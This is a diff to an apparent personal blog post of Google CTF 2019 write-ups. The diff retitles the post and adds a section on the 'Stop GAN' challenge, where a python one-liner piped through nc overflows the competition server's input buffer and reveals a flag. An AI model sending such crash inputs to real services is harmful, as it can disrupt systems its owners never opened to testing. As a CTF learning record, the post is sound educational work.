@@ -1,5 +1,5 @@
 ---
-title: 'Writeups for Google CTF 2019: My first CTF (Kinda)'
+title: 'Writeups for Google CTF 2019: My first CTF (Kinda) - Part 1'
 layout: post
 sidebar_link: true
 tags:
@@ -315,7 +315,7 @@ Well, looks like we got our Flag in some tasty cookies!
 **Lesson Learned:** Always consult [OWASP](https://www.owasp.org/).
 
 ## Stop GAN - Pwn
-
+![stop_gan.png](/images/ctf_images/google_2019/stop_gan.png)
 
 Again downloading and unzipping we have:
 ```
@@ -422,3 +422,24 @@ Cauliflower systems never crash >>
 ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
 segfault detected! ***CRASH***could not open flag
 ```
+
+This clearly crashes the program! So let's try the same thing on official server but with a little help from python to automate our input:
+```
+$python2 -c "print 'run';print 'A'*999" | nc buffer-overflow.ctfcompetition.com 1337
+Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
+ Bonus flag for controlling the crash.
+
+Console commands:
+run
+quit
+>>Inputs: run
+CTF{Why_does_cauliflower_threaten_us}
+Cauliflower systems never crash >>
+segfault detected! ***CRASH***
+Console commands:
+run
+quit
+>>
+```
+
+Here we got the next flag! So doing this we finally come to the end of this route that we had taken. Let's go back to the other route now in the [next part](/2019/06/29/Google-CTF-Writeups-Part-2.html)!
